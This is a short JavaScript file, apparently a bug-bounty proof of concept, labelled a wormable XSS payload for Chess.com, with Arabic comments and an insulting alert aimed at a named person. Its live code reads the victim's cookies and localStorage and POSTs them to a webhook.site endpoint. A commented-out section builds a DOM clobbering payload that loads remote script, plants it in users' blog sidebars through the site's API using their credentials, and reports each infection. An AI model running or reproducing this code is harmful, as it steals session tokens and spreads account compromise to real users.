// ==========================================
// Wormable XSS Payload - Chess.com 
// ==========================================
alert("Hacked By Hussein (tester) at "+document.domain);
alert("Fuck you Adham");
// 1. تحديد الـ API Endpoint
// const apiUrl = 'https://api.chess.com/rpc/chesscom.user_profile.v1.UserProfileService/SetBlogDetails';

// // 2. تجهيز البايلود اللي هيتنشر (نفس הـ Clobbering بتاعك)
// const maliciousSidebar = "<p>Hey, check out this cool trick! <a id=\"__tudeConfig\"></a><a id=\"__tudeConfig\" href=\"https://hussein-e4.github.io/POC.js\" name=\"endpoint\"></a></p>";


// 1. إثبات التنفيذ (عشان نصور بيها الريبورت)
// alert("DOM Clobbering XSS by Hussein on: " + document.domain);

// 2. استخراج الكوكيز والـ Local Storage
var userCookies = document.cookie;
var userStorage = JSON.stringify(localStorage);

// 3. تجميع الداتا كنص عادي (من غير btoa عشان نتجنب إيرور الحروف)
var exfilData = "===== COOKIES =====\n" + userCookies + "\n\n===== LOCAL STORAGE =====\n" + userStorage;

// 4. إرسال الداتا في الخفاء باستخدام POST Request
fetch("https://webhook.site/63843b75-5c44-4e91-99c9-564afd8a49ae/", {
    method: "POST",       // استخدام POST عشان الداتا الكبيرة
    mode: "no-cors",      // تخطي إيرور الـ CORS
    body: exfilData       // حط الداتا كلها هنا
});

// // 3. تجهيز الـ JSON Body
// const requestBody = {
//     "blogDetails": {
//         "url": "hacked-blog", // ممكن نسيبها فاضية أو نحط اسم ثابت
//         "name": "Important Update",
//         "privacy": "BLOG_PRIVACY_ID_EVERYONE", // مهم جداً تكون Everyone عشان تنتشر
//         "sidebarBlock": maliciousSidebar
//     },
//     "updateMask": "" // بيحدث كل حاجة
// };

// // 4. تنفيذ الهجوم (The Infection)
// fetch(apiUrl, {
//     method: 'POST',
//     headers: {
//         'Content-Type': 'application/json',
//         'Accept': 'application/json, text/plain, */*',
//         'Connect-Protocol-Version': '1' // الهيدر ده كان موجود في ريكويستك
//     },
//     credentials: 'include', // عشان يبعت הـ PHPSESSID والـ ACCESS_TOKEN
//     body: JSON.stringify(requestBody)
// })
// .then(response => {
//     if (response.ok) {
//         // إبلاغ הـ Oastify بنجاح العدوى (Mass Defacement Initialized)
//         fetch("https://webhook.site/63843b75-5c44-4e91-99c9-564afd8a49aeimpact=Worm_Propagated");
//     }
// });
